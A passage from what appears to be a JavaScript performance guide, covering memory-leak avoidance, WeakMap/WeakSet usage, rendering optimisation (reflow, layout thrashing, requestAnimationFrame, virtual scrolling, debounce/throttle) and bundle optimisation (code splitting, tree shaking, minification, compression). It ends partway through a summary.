#### WeakMap for Private Data

```javascript
// Private data using WeakMap
const privateData = new WeakMap();

class BankAccount {
  constructor(balance) {
    privateData.set(this, { balance });
  }
  
  getBalance() {
    return privateData.get(this).balance;
  }
  
  deposit(amount) {
    const data = privateData.get(this);
    data.balance += amount;
  }
  
  withdraw(amount) {
    const data = privateData.get(this);
    if (data.balance >= amount) {
      data.balance -= amount;
      return true;
    }
    return false;
  }
}

const account = new BankAccount(1000);
console.log(account.getBalance()); // 1000
account.deposit(500);
console.log(account.getBalance()); // 1500

// Private data can't be accessed directly
console.log(account.balance); // undefined
```

#### WeakSet for Tracking

```javascript
const processedObjects = new WeakSet();

function processOnce(obj) {
  if (processedObjects.has(obj)) {
    console.log('Already processed');
    return;
  }
  
  console.log('Processing:', obj);
  // Process object...
  
  processedObjects.add(obj);
}

const obj1 = { id: 1 };
const obj2 = { id: 2 };

processOnce(obj1); // Processing: { id: 1 }
processOnce(obj1); // Already processed
processOnce(obj2); // Processing: { id: 2 }
```

#### WeakMap for Caching

```javascript
const cache = new WeakMap();

function expensiveOperation(obj) {
  if (cache.has(obj)) {
    console.log('Cache hit');
    return cache.get(obj);
  }
  
  console.log('Computing...');
  // Expensive computation
  const result = {
    value: obj.value * 2,
    computed: Date.now()
  };
  
  cache.set(obj, result);
  return result;
}

const data = { value: 42 };

console.log(expensiveOperation(data)); // Computing...
console.log(expensiveOperation(data)); // Cache hit

// When data is GC'd, cache entry is automatically removed
```

### Avoiding Memory Leaks

Common patterns that cause memory leaks and how to fix them.

#### Event Listeners

```javascript
// BAD: Memory leak
class LeakyComponent {
  constructor(element) {
    this.element = element;
    this.data = new Array(10000).fill('data');
    
    // Event listener keeps reference to component
    this.element.addEventListener('click', () => {
      console.log(this.data);
    });
  }
}

// If element is removed from DOM, component can't be GC'd

// GOOD: Remove listeners
class ProperComponent {
  constructor(element) {
    this.element = element;
    this.data = new Array(10000).fill('data');
    
    this.handleClick = () => {
      console.log(this.data);
    };
    
    this.element.addEventListener('click', this.handleClick);
  }
  
  destroy() {
    this.element.removeEventListener('click', this.handleClick);
    this.element = null;
    this.data = null;
  }
}
```

#### Timers

```javascript
// BAD: Memory leak
class LeakyTimer {
  constructor() {
    this.data = new Array(10000).fill('data');
    
    setInterval(() => {
      console.log(this.data.length);
    }, 1000);
  }
}

// Timer keeps running even if object is no longer needed

// GOOD: Clear timers
class ProperTimer {
  constructor() {
    this.data = new Array(10000).fill('data');
    
    this.timerId = setInterval(() => {
      console.log(this.data.length);
    }, 1000);
  }
  
  destroy() {
    clearInterval(this.timerId);
    this.data = null;
  }
}
```

#### Closures

```javascript
// BAD: Closure captures large object
function createHandler() {
  const largeObject = new Array(10000).fill('data');
  const smallValue = 42;
  
  return function() {
    console.log(smallValue);
    // largeObject is captured but not used!
  };
}

// GOOD: Only capture what's needed
function createHandlerOptimized() {
  const largeObject = new Array(10000).fill('data');
  const smallValue = 42;
  
  // Process large object and discard
  const result = largeObject.length + smallValue;
  
  return function() {
    console.log(result);
    // Only captures result, not largeObject
  };
}
```

#### Detached DOM Nodes

```javascript
// BAD: Keeping references to removed DOM nodes
const detachedNodes = [];

function createAndRemoveNode() {
  const div = document.createElement('div');
  div.innerHTML = 'Content';
  document.body.appendChild(div);
  
  // Store reference
  detachedNodes.push(div);
  
  // Remove from DOM
  document.body.removeChild(div);
  
  // div is detached but still referenced - memory leak!
}

// GOOD: Don't keep references
function createAndRemoveNodeProper() {
  const div = document.createElement('div');
  div.innerHTML = 'Content';
  document.body.appendChild(div);
  
  // Use node...
  
  // Remove from DOM
  document.body.removeChild(div);
  
  // No reference kept - can be GC'd
}
```

#### Circular References

```javascript
// BAD: Circular references with DOM
function createCircularLeak() {
  const element = document.createElement('div');
  const data = {
    element: element,
    info: new Array(10000).fill('data')
  };
  
  // Circular reference
  element.myData = data;
  
  document.body.appendChild(element);
  
  return element;
}

// GOOD: Use WeakMap
const elementData = new WeakMap();

function createProper() {
  const element = document.createElement('div');
  const data = {
    info: new Array(10000).fill('data')
  };
  
  // No circular reference
  elementData.set(element, data);
  
  document.body.appendChild(element);
  
  return element;
}
```

---

## Summary

This document covered Code-Level and Memory Optimization:

**Code-Level Optimization:**

- Loop optimization (caching length, unrolling, avoiding calls, early breaks)
- Function call overhead (inlining, memoization, reducing recursion, binding)
- Variable scope (local vs global, caching properties, closure optimization)
- Avoiding unnecessary work (short-circuit, memoization, early returns)
- Lazy evaluation (initialization, generators, properties, module loading)

**Memory Optimization:**

- Reducing allocations (reusing objects, string handling, pre-allocation, typed arrays)
- Object pooling (particles, buffers, connections)
- WeakMap/WeakSet (metadata, private data, tracking, caching)
- Avoiding leaks (event listeners, timers, closures, DOM nodes, circular references)

These optimizations help create faster, more memory-efficient JavaScript applications.

---

**Related Topics:**

- Rendering Performance
- Bundle Optimization
- Profiling Tools
- Performance Monitoring
# Rendering & Bundle


## 23.5 Rendering Performance

Browser rendering performance is crucial for smooth user experiences.

### Reflow and Repaint

Understanding the browser's rendering pipeline helps avoid performance bottlenecks.

#### Browser Rendering Pipeline

```
1. JavaScript â†’ 2. Style â†’ 3. Layout â†’ 4. Paint â†’ 5. Composite
```

**Reflow (Layout)**: Recalculating element positions and sizes **Repaint (Paint)**: Redrawing pixels on screen **Composite**: Layering painted elements

```javascript
// EXPENSIVE: Causes reflow
element.style.width = '100px';  // Reflow + Repaint
element.style.height = '100px'; // Reflow + Repaint

// LESS EXPENSIVE: Only causes repaint
element.style.color = 'red';       // Repaint only
element.style.backgroundColor = 'blue'; // Repaint only

// CHEAP: Only causes composite
element.style.transform = 'translateX(100px)'; // Composite only
element.style.opacity = 0.5;                   // Composite only
```

#### Properties That Trigger Reflow

```javascript
// Reading these properties forces synchronous reflow
const element = document.getElementById('myElement');

// Geometric properties (SLOW - trigger reflow)
const width = element.offsetWidth;
const height = element.offsetHeight;
const top = element.offsetTop;
const left = element.offsetLeft;

const clientWidth = element.clientWidth;
const clientHeight = element.clientHeight;

const scrollTop = element.scrollTop;
const scrollHeight = element.scrollHeight;

// Getting computed style (SLOW - may trigger reflow)
const computed = window.getComputedStyle(element);
const fontSize = computed.fontSize;

// Writing these properties triggers reflow
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';
element.style.padding = '10px';
element.style.border = '1px solid black';
element.style.display = 'block';
element.style.position = 'absolute';
```

#### Batching DOM Changes

```javascript
const container = document.getElementById('container');

// BAD: Interleaved reads and writes (causes multiple reflows)
console.time('Interleaved');
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  container.appendChild(div);
  
  // Reading offsetHeight forces reflow
  const height = div.offsetHeight;
  div.style.height = (height * 2) + 'px';
}
console.timeEnd('Interleaved');

// GOOD: Batch reads, then batch writes
console.time('Batched');
const elements = [];

// Create all elements
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  elements.push(div);
}

// Append all at once
const fragment = document.createDocumentFragment();
elements.forEach(el => fragment.appendChild(el));
container.appendChild(fragment); // Single reflow

// Read all heights
const heights = elements.map(el => el.offsetHeight); // Single forced reflow

// Write all heights
elements.forEach((el, i) => {
  el.style.height = (heights[i] * 2) + 'px';
}); // Single reflow

console.timeEnd('Batched');
```

#### Using DocumentFragment

```javascript
// BAD: Multiple reflows
console.time('Direct append');
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  container.appendChild(div); // Reflow each time
}
console.timeEnd('Direct append');

// GOOD: Single reflow
console.time('Fragment');
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div); // No reflow
}

container.appendChild(fragment); // Single reflow
console.timeEnd('Fragment');

// BEST: innerHTML for static content
console.time('innerHTML');
const html = Array.from({ length: 1000 }, (_, i) => 
  `<div>Item ${i}</div>`
).join('');
container.innerHTML = html; // Single reflow
console.timeEnd('innerHTML');
```

#### CSS Class Changes

```javascript
// BAD: Multiple style changes
element.style.width = '100px';
element.style.height = '100px';
element.style.backgroundColor = 'red';
element.style.border = '1px solid black';
// 4 reflows

// GOOD: Single class change
element.className = 'styled'; // 1 reflow

// Or use classList
element.classList.add('styled'); // 1 reflow

// CSS:
// .styled {
//   width: 100px;
//   height: 100px;
//   background-color: red;
//   border: 1px solid black;
// }
```

#### Avoid Forced Synchronous Layout

```javascript
// BAD: Reading property that was just modified
element.style.width = '100px';
const width = element.offsetWidth; // Forces immediate reflow!

// GOOD: Read first, then write
const width = element.offsetWidth;
element.style.width = (width * 2) + 'px';

// BETTER: Use transform instead of width
element.style.transform = 'scaleX(2)'; // No reflow!
```

### Layout Thrashing

Layout thrashing occurs when you repeatedly read and write to the DOM, forcing synchronous reflows.

#### What is Layout Thrashing

```javascript
// BAD: Layout thrashing
function updateElements() {
  const elements = document.querySelectorAll('.item');
  
  elements.forEach(el => {
    // Read (forces reflow)
    const height = el.offsetHeight;
    
    // Write (invalidates layout)
    el.style.height = (height + 10) + 'px';
    
    // Next read forces another reflow!
  });
}

// GOOD: Batch reads and writes
function updateElementsOptimized() {
  const elements = document.querySelectorAll('.item');
  
  // Batch all reads
  const heights = Array.from(elements).map(el => el.offsetHeight);
  
  // Batch all writes
  elements.forEach((el, i) => {
    el.style.height = (heights[i] + 10) + 'px';
  });
}
```

#### FastDOM Library Pattern

```javascript
// Manual read/write batching
const reads = [];
const writes = [];
let scheduled = false;

function fastdom() {
  if (!scheduled) {
    scheduled = true;
    requestAnimationFrame(() => {
      // Execute all reads
      reads.forEach(fn => fn());
      reads.length = 0;
      
      // Execute all writes
      writes.forEach(fn => fn());
      writes.length = 0;
      
      scheduled = false;
    });
  }
}

function measure(fn) {
  reads.push(fn);
  fastdom();
}

function mutate(fn) {
  writes.push(fn);
  fastdom();
}

// Usage
const element = document.getElementById('box');

measure(() => {
  const height = element.offsetHeight;
  
  mutate(() => {
    element.style.height = (height + 10) + 'px';
  });
});
```

#### Intersection Observer Instead of Scroll

```javascript
// BAD: Scroll handler causes layout thrashing
window.addEventListener('scroll', () => {
  const elements = document.querySelectorAll('.lazy-load');
  
  elements.forEach(el => {
    const rect = el.getBoundingClientRect(); // Forced reflow!
    
    if (rect.top < window.innerHeight) {
      loadImage(el);
    }
  });
});

// GOOD: Use Intersection Observer
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadImage(entry.target);
      observer.unobserve(entry.target);
    }
  });
}, {
  rootMargin: '50px' // Start loading 50px before visible
});

document.querySelectorAll('.lazy-load').forEach(el => {
  observer.observe(el);
});
```

### requestAnimationFrame

requestAnimationFrame synchronizes animations with the browser's refresh rate.

#### Basic Usage

```javascript
// BAD: Using setTimeout for animations
let position = 0;

function animate() {
  position += 1;
  element.style.left = position + 'px';
  
  setTimeout(animate, 16); // ~60fps, but not synchronized
}

animate();

// GOOD: Use requestAnimationFrame
let position = 0;

function animateOptimized() {
  position += 1;
  element.style.left = position + 'px';
  
  if (position < 500) {
    requestAnimationFrame(animateOptimized);
  }
}

requestAnimationFrame(animateOptimized);
```

#### Smooth Animations

```javascript
function smoothAnimate() {
  let start = null;
  const duration = 1000; // 1 second
  const element = document.getElementById('box');
  const startPosition = 0;
  const endPosition = 500;
  
  function step(timestamp) {
    if (!start) start = timestamp;
    const progress = timestamp - start;
    const percentage = Math.min(progress / duration, 1);
    
    // Easing function (ease-out)
    const eased = 1 - Math.pow(1 - percentage, 3);
    
    const currentPosition = startPosition + (endPosition - startPosition) * eased;
    element.style.transform = `translateX(${currentPosition}px)`;
    
    if (progress < duration) {
      requestAnimationFrame(step);
    }
  }
  
  requestAnimationFrame(step);
}

smoothAnimate();
```

#### Canceling Animations

```javascript
let animationId = null;

function startAnimation() {
  let position = 0;
  
  function animate() {
    position += 2;
    element.style.left = position + 'px';
    
    if (position < 500) {
      animationId = requestAnimationFrame(animate);
    }
  }
  
  animationId = requestAnimationFrame(animate);
}

function stopAnimation() {
  if (animationId) {
    cancelAnimationFrame(animationId);
    animationId = null;
  }
}

// Start animation
startAnimation();

// Stop after 2 seconds
setTimeout(stopAnimation, 2000);
```

#### Performance Monitoring

```javascript
class FPSMonitor {
  constructor() {
    this.frames = [];
    this.lastTime = performance.now();
  }
  
  start() {
    const loop = (currentTime) => {
      // Calculate time since last frame
      const delta = currentTime - this.lastTime;
      this.lastTime = currentTime;
      
      // Store frame time
      this.frames.push(delta);
      
      // Keep only last 60 frames
      if (this.frames.length > 60) {
        this.frames.shift();
      }
      
      // Calculate average FPS
      if (this.frames.length > 0) {
        const avgDelta = this.frames.reduce((a, b) => a + b) / this.frames.length;
        const fps = Math.round(1000 / avgDelta);
        
        document.getElementById('fps').textContent = `${fps} FPS`;
      }
      
      requestAnimationFrame(loop);
    };
    
    requestAnimationFrame(loop);
  }
}

const monitor = new FPSMonitor();
monitor.start();
```

### Virtual Scrolling

Virtual scrolling only renders visible items, dramatically improving performance for long lists.

#### Basic Virtual Scrolling

```javascript
class VirtualScroller {
  constructor(container, items, itemHeight) {
    this.container = container;
    this.items = items;
    this.itemHeight = itemHeight;
    this.visibleCount = Math.ceil(container.clientHeight / itemHeight);
    this.scrollTop = 0;
    
    this.init();
  }
  
  init() {
    // Set container height to represent all items
    this.container.style.height = `${this.items.length * this.itemHeight}px`;
    this.container.style.position = 'relative';
    this.container.style.overflow = 'auto';
    
    // Create visible items container
    this.viewport = document.createElement('div');
    this.viewport.style.position = 'absolute';
    this.viewport.style.top = '0';
    this.viewport.style.width = '100%';
    this.container.appendChild(this.viewport);
    
    // Handle scroll
    this.container.addEventListener('scroll', () => this.handleScroll());
    
    // Initial render
    this.render();
  }
  
  handleScroll() {
    this.scrollTop = this.container.scrollTop;
    this.render();
  }
  
  render() {
    // Calculate which items should be visible
    const startIndex = Math.floor(this.scrollTop / this.itemHeight);
    const endIndex = Math.min(
      startIndex + this.visibleCount + 1,
      this.items.length
    );
    
    // Clear viewport
    this.viewport.innerHTML = '';
    
    // Position viewport
    this.viewport.style.transform = `translateY(${startIndex * this.itemHeight}px)`;
    
    // Render visible items
    for (let i = startIndex; i < endIndex; i++) {
      const item = document.createElement('div');
      item.style.height = `${this.itemHeight}px`;
      item.textContent = this.items[i];
      this.viewport.appendChild(item);
    }
  }
}

// Usage
const container = document.getElementById('scroll-container');
const items = Array.from({ length: 100000 }, (_, i) => `Item ${i}`);

const scroller = new VirtualScroller(container, items, 50);
```

#### Advanced Virtual Scrolling with Buffer

```javascript
class AdvancedVirtualScroller {
  constructor(container, items, itemHeight, bufferSize = 5) {
    this.container = container;
    this.items = items;
    this.itemHeight = itemHeight;
    this.bufferSize = bufferSize;
    this.visibleCount = Math.ceil(container.clientHeight / itemHeight);
    this.scrollTop = 0;
    this.renderedItems = new Map();
    
    this.init();
  }
  
  init() {
    // Wrapper for total height
    this.wrapper = document.createElement('div');
    this.wrapper.style.height = `${this.items.length * this.itemHeight}px`;
    this.wrapper.style.position = 'relative';
    this.container.appendChild(this.wrapper);
    
    // Viewport for visible items
    this.viewport = document.createElement('div');
    this.viewport.style.position = 'absolute';
    this.viewport.style.top = '0';
    this.viewport.style.width = '100%';
    this.wrapper.appendChild(this.viewport);
    
    // Scroll handler with RAF
    let ticking = false;
    this.container.addEventListener('scroll', () => {
      if (!ticking) {
        requestAnimationFrame(() => {
          this.handleScroll();
          ticking = false;
        });
        ticking = true;
      }
    });
    
    this.render();
  }
  
  handleScroll() {
    this.scrollTop = this.container.scrollTop;
    this.render();
  }
  
  render() {
    const startIndex = Math.max(
      0,
      Math.floor(this.scrollTop / this.itemHeight) - this.bufferSize
    );
    const endIndex = Math.min(
      this.items.length,
      Math.ceil((this.scrollTop + this.container.clientHeight) / this.itemHeight) + this.bufferSize
    );
    
    // Remove items outside range
    for (const [index, element] of this.renderedItems) {
      if (index < startIndex || index >= endIndex) {
        element.remove();
        this.renderedItems.delete(index);
      }
    }
    
    // Add items in range
    for (let i = startIndex; i < endIndex; i++) {
      if (!this.renderedItems.has(i)) {
        const item = this.createItem(i);
        this.viewport.appendChild(item);
        this.renderedItems.set(i, item);
      }
    }
  }
  
  createItem(index) {
    const item = document.createElement('div');
    item.style.position = 'absolute';
    item.style.top = `${index * this.itemHeight}px`;
    item.style.height = `${this.itemHeight}px`;
    item.style.width = '100%';
    item.textContent = this.items[index];
    item.dataset.index = index;
    return item;
  }
}

// Usage with 1 million items
const container = document.getElementById('advanced-scroller');
const items = Array.from({ length: 1000000 }, (_, i) => `Item ${i}`);

const scroller = new AdvancedVirtualScroller(container, items, 40, 10);
```

### Debouncing and Throttling

Rate limiting for event handlers improves performance.

#### Debouncing

Debouncing delays function execution until after a pause in events.

```javascript
// Basic debounce
function debounce(func, delay) {
  let timeoutId;
  
  return function(...args) {
    clearTimeout(timeoutId);
    
    timeoutId = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}

// Usage: Search input
const searchInput = document.getElementById('search');

// BAD: Fires on every keystroke
searchInput.addEventListener('input', (e) => {
  performSearch(e.target.value); // Expensive!
});

// GOOD: Debounced - only fires after user stops typing
const debouncedSearch = debounce((value) => {
  performSearch(value);
}, 300);

searchInput.addEventListener('input', (e) => {
  debouncedSearch(e.target.value);
});

function performSearch(query) {
  console.log('Searching for:', query);
  // Make API call...
}
```

#### Advanced Debounce with Leading/Trailing

```javascript
function advancedDebounce(func, delay, { leading = false, trailing = true } = {}) {
  let timeoutId;
  let lastArgs;
  
  return function(...args) {
    lastArgs = args;
    
    const callNow = leading && !timeoutId;
    
    clearTimeout(timeoutId);
    
    timeoutId = setTimeout(() => {
      if (trailing) {
        func.apply(this, lastArgs);
      }
      timeoutId = null;
    }, delay);
    
    if (callNow) {
      func.apply(this, args);
    }
  };
}

// Leading: Execute immediately, then wait
const leadingDebounce = advancedDebounce(handleResize, 300, { leading: true, trailing: false });

// Trailing: Wait, then execute (default)
const trailingDebounce = advancedDebounce(handleResize, 300, { trailing: true });

// Both: Execute immediately, then again after pause
const bothDebounce = advancedDebounce(handleResize, 300, { leading: true, trailing: true });

function handleResize() {
  console.log('Window resized:', window.innerWidth);
}

window.addEventListener('resize', leadingDebounce);
```

#### Throttling

Throttling limits function execution to once per time interval.

```javascript
// Basic throttle
function throttle(func, limit) {
  let inThrottle;
  
  return function(...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      
      setTimeout(() => {
        inThrottle = false;
      }, limit);
    }
  };
}

// Usage: Scroll handler
// BAD: Fires hundreds of times per second
window.addEventListener('scroll', () => {
  updateScrollProgress(); // Expensive!
});

// GOOD: Throttled - fires at most once per 100ms
const throttledScroll = throttle(() => {
  updateScrollProgress();
}, 100);

window.addEventListener('scroll', throttledScroll);

function updateScrollProgress() {
  const scrollTop = window.pageYOffset;
  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
  const progress = (scrollTop / docHeight) * 100;
  
  document.getElementById('progress').style.width = `${progress}%`;
}
```

#### Advanced Throttle with Leading/Trailing

```javascript
function advancedThrottle(func, limit, { leading = true, trailing = true } = {}) {
  let timeout;
  let lastRan;
  let lastFunc;
  
  return function(...args) {
    const context = this;
    
    if (!lastRan) {
      if (leading) {
        func.apply(context, args);
      }
      lastRan = Date.now();
    } else {
      clearTimeout(timeout);
      
      lastFunc = () => {
        if (Date.now() - lastRan >= limit) {
          func.apply(context, args);
          lastRan = Date.now();
        }
      };
      
      timeout = setTimeout(() => {
        if (trailing) {
          lastFunc();
        }
      }, limit - (Date.now() - lastRan));
    }
  };
}

// Mouse move throttling
const throttledMouseMove = advancedThrottle((e) => {
  console.log('Mouse position:', e.clientX, e.clientY);
}, 100);

document.addEventListener('mousemove', throttledMouseMove);
```

#### RequestAnimationFrame Throttle

```javascript
// Throttle to animation frame (best for visual updates)
function rafThrottle(func) {
  let requestId;
  let lastArgs;
  
  const later = (context) => () => {
    requestId = null;
    func.apply(context, lastArgs);
  };
  
  return function(...args) {
    lastArgs = args;
    
    if (!requestId) {
      requestId = requestAnimationFrame(later(this));
    }
  };
}

// Perfect for scroll animations
const rafScrollHandler = rafThrottle(() => {
  const scrollTop = window.pageYOffset;
  
  // Update parallax elements
  document.querySelectorAll('.parallax').forEach(el => {
    const speed = el.dataset.speed || 0.5;
    el.style.transform = `translateY(${scrollTop * speed}px)`;
  });
});

window.addEventListener('scroll', rafScrollHandler);
```

---

## 23.6 Bundle Optimization

Optimizing JavaScript bundles reduces load time and improves performance.

### Code Splitting

Split code into smaller chunks loaded on demand.

#### Dynamic Imports

```javascript
// Instead of importing everything upfront
import heavyLibrary from 'heavy-library';
import anotherLib from 'another-lib';
import utils from './utils';

// Dynamic import - load only when needed
async function processSpecialData(data) {
  if (data.requiresHeavyProcessing) {
    // Load heavy library only when needed
    const { default: heavyLibrary } = await import('heavy-library');
    return heavyLibrary.process(data);
  }
  
  return simpleProcess(data);
}

// Route-based code splitting
async function loadRoute(routeName) {
  switch (routeName) {
    case 'home':
      const { HomePage } = await import('./pages/HomePage');
      return HomePage;
    
    case 'dashboard':
      const { Dashboard } = await import('./pages/Dashboard');
      return Dashboard;
    
    case 'settings':
      const { Settings } = await import('./pages/Settings');
      return Settings;
    
    default:
      const { NotFound } = await import('./pages/NotFound');
      return NotFound;
  }
}
```

#### Webpack Code Splitting

```javascript
// webpack.config.js
module.exports = {
  entry: './src/index.js',
  output: {
    filename: '[name].[contenthash].js',
    path: path.resolve(__dirname, 'dist'),
    chunkFilename: '[name].[contenthash].chunk.js'
  },
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // Vendor chunk for node_modules
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          priority: 10
        },
        // Common chunk for shared code
        common: {
          minChunks: 2,
          priority: 5,
          reuseExistingChunk: true
        }
      }
    }
  }
};

// Magic comments for webpack
// Named chunks
import(/* webpackChunkName: "heavy-feature" */ './heavyFeature');

// Prefetch (load during idle time)
import(/* webpackPrefetch: true */ './futureFeature');

// Preload (load in parallel with parent)
import(/* webpackPreload: true */ './criticalFeature');
```

#### React Lazy Loading

```javascript
import React, { Suspense, lazy } from 'react';

// Lazy load components
const Dashboard = lazy(() => import('./Dashboard'));
const Settings = lazy(() => import('./Settings'));
const Profile = lazy(() => import('./Profile'));

function App() {
  return (
    <div>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/settings" element={<Settings />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </div>
  );
}

// With error boundary
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>;
    }
    return this.props.children;
  }
}

function AppWithErrorBoundary() {
  return (
    <ErrorBoundary>
      <Suspense fallback={<LoadingSpinner />}>
        <LazyComponent />
      </Suspense>
    </ErrorBoundary>
  );
}
```

### Tree Shaking

Remove unused code from the final bundle.

#### ES6 Modules for Tree Shaking

```javascript
// utils.js - Use named exports
export function usedFunction() {
  return 'This is used';
}

export function unusedFunction() {
  return 'This is never imported';
}

export function anotherUnusedFunction() {
  return 'Also never imported';
}

// main.js - Only import what you need
import { usedFunction } from './utils';

console.log(usedFunction());

// Bundle will only include usedFunction, not the unused ones
```

#### Side Effects

```javascript
// package.json - Mark packages as side-effect free
{
  "name": "my-package",
  "sideEffects": false  // No side effects, safe to tree-shake
}

// Or specify files with side effects
{
  "name": "my-package",
  "sideEffects": [
    "*.css",
    "*.scss",
    "./src/polyfills.js"
  ]
}

// Code with side effects (can't be tree-shaken)
// globals.js
window.myGlobal = 'value';  // Side effect!

export function myFunction() {
  return 'hello';
}

// Code without side effects (can be tree-shaken)
// pure.js
export function add(a, b) {
  return a + b;  // Pure function, no side effects
}
```

#### Webpack Tree Shaking Configuration

```javascript
// webpack.config.js
module.exports = {
  mode: 'production', // Enables tree shaking
  optimization: {
    usedExports: true,  // Mark unused exports
    minimize: true,      // Remove unused code
    sideEffects: true    // Respect package.json sideEffects
  }
};

// Lodash tree shaking
// BAD: Imports entire lodash
import _ from 'lodash';
_.map([1, 2, 3], n => n * 2);

// GOOD: Import only what you need
import map from 'lodash/map';
map([1, 2, 3], n => n * 2);

// BETTER: Use lodash-es (ES6 modules)
import { map } from 'lodash-es';
map([1, 2, 3], n => n * 2);
```

#### Analyzing Bundle Size

```javascript
// Install webpack-bundle-analyzer
// npm install --save-dev webpack-bundle-analyzer

// webpack.config.js
const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;

module.exports = {
  plugins: [
    new BundleAnalyzerPlugin({
      analyzerMode: 'static',
      reportFilename: 'bundle-report.html',
      openAnalyzer: false
    })
  ]
};

// Run build and open bundle-report.html to see what's in your bundle
```

### Minification

Reduce code size by removing whitespace and shortening names.

#### Terser for JavaScript

```javascript
// webpack.config.js
const TerserPlugin = require('terser-webpack-plugin');

module.exports = {
  optimization: {
    minimize: true,
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          compress: {
            drop_console: true,      // Remove console.log
            drop_debugger: true,     // Remove debugger
            pure_funcs: ['console.info', 'console.debug']  // Remove specific functions
          },
          mangle: {
            safari10: true  // Fix Safari 10 issues
          },
          format: {
            comments: false  // Remove comments
          }
        },
        extractComments: false  // Don't create separate LICENSE file
      })
    ]
  }
};

// Before minification:
function calculateTotal(items) {
  let total = 0;
  for (let i = 0; i < items.length; i++) {
    total += items[i].price * items[i].quantity;
  }
  return total;
}

// After minification:
function c(t){let e=0;for(let r=0;r<t.length;r++)e+=t[r].price*t[r].quantity;return e}
```

#### CSS Minification

```javascript
// Install css-minimizer-webpack-plugin
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');

module.exports = {
  optimization: {
    minimizer: [
      new CssMinimizerPlugin({
        minimizerOptions: {
          preset: [
            'default',
            {
              discardComments: { removeAll: true },
              normalizeWhitespace: true,
              colormin: true,
              minifyFontValues: true
            }
          ]
        }
      })
    ]
  }
};

// Before:
.container {
  background-color: #ffffff;
  margin: 10px 10px 10px 10px;
  padding: 0px;
}

// After:
.container{background-color:#fff;margin:10px;padding:0}
```

#### HTML Minification

```javascript
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  plugins: [
    new HtmlWebpackPlugin({
      template: './src/index.html',
      minify: {
        collapseWhitespace: true,
        removeComments: true,
        removeRedundantAttributes: true,
        removeScriptTypeAttributes: true,
        removeStyleLinkTypeAttributes: true,
        useShortDoctype: true,
        minifyCSS: true,
        minifyJS: true
      }
    })
  ]
};
```

### Compression

Compress assets for faster transfer over the network.

#### Gzip Compression

```javascript
// Server-side (Express)
const compression = require('compression');
const express = require('express');

const app = express();

// Enable gzip compression
app.use(compression({
  level: 6,  // Compression level (0-9)
  threshold: 1024,  // Only compress files > 1KB
  filter: (req, res) => {
    // Don't compress if client doesn't accept gzip
    if (req.headers['x-no-compression']) {
      return false;
    }
    return compression.filter(req, res);
  }
}));

app.use(express.static('public'));

app.listen(3000);
```

#### Brotli Compression

```javascript
// Webpack plugin for pre-compression
const CompressionPlugin = require('compression-webpack-plugin');
const zlib = require('zlib');

module.exports = {
  plugins: [
    // Gzip compression
    new CompressionPlugin({
      filename: '[path][base].gz',
      algorithm: 'gzip',
      test: /\.(js|css|html|svg)$/,
      threshold: 10240,  // Only compress files > 10KB
      minRatio: 0.8      // Only compress if size reduction > 20%
    }),
    
    // Brotli compression (better than gzip)
    new CompressionPlugin({
      filename: '[path][base].br',
      algorithm: 'brotliCompress',
      test: /\.(js|css|html|svg)$/,
      compressionOptions: {
        params: {
          [zlib.constants.BROTLI_PARAM_QUALITY]: 11
        }
      },
      threshold: 10240,
      minRatio: 0.8
    })
  ]
};

// Server-side (Express) - Serve pre-compressed files
const express = require('express');
const expressStaticGzip = require('express-static-gzip');

const app = express();

app.use('/', expressStaticGzip('public', {
  enableBrotli: true,
  orderPreference: ['br', 'gz']  // Prefer brotli over gzip
}));

app.listen(3000);
```

#### Content-Type Specific Compression

```javascript
// Server configuration
app.use(compression({
  filter: (req, res) => {
    const contentType = res.getHeader('Content-Type');
    
    // Compress these types
    const compressible = [
      'text/html',
      'text/css',
      'text/javascript',
      'application/javascript',
      'application/json',
      'application/xml',
      'image/svg+xml'
    ];
    
    return compressible.some(type => contentType && contentType.includes(type));
  }
}));
```

#### Image Compression

```javascript
// Webpack image optimization
const ImageMinimizerPlugin = require('image-minimizer-webpack-plugin');

module.exports = {
  optimization: {
    minimizer: [
      new ImageMinimizerPlugin({
        minimizer: {
          implementation: ImageMinimizerPlugin.imageminGenerate,
          options: {
            plugins: [
              ['imagemin-mozjpeg', { quality: 80 }],
              ['imagemin-pngquant', { quality: [0.6, 0.8] }],
              ['imagemin-svgo', {
                plugins: [
                  {
                    name: 'removeViewBox',
                    active: false
                  }
                ]
              }]
            ]
          }
        }
      })
    ]
  }
};

// Modern format generation
new ImageMinimizerPlugin({
  generator: [
    {
      preset: 'webp',
      implementation: ImageMinimizerPlugin.imageminGenerate,
      options: {
        plugins: ['imagemin-webp']
      }
    }
  ]
});

// Usage in HTML
<picture>
  <source srcset="image.webp" type="image/webp">
  <source srcset="image.jpg" type="image/jpeg">
  <img src="image.jpg" alt="Fallback">
</picture>
```

---

## Summary

This document covered Rendering and Bundle Optimization:

**Rendering Performance:**

- Reflow and repaint (rendering pipeline, batching changes, DocumentFragment, CSS classes)
- Layout thrashing (read/write separation, FastDOM pattern, Intersection Observer)
- requestAnimationFrame (smooth animations, FPS monitoring, cancellation)
- Virtual scrolling (basic implementation, advanced with buffer)
- Debouncing and throttling (rate limiting, leading/trailing options, RAF throttle)

**Bundle Optimization:**

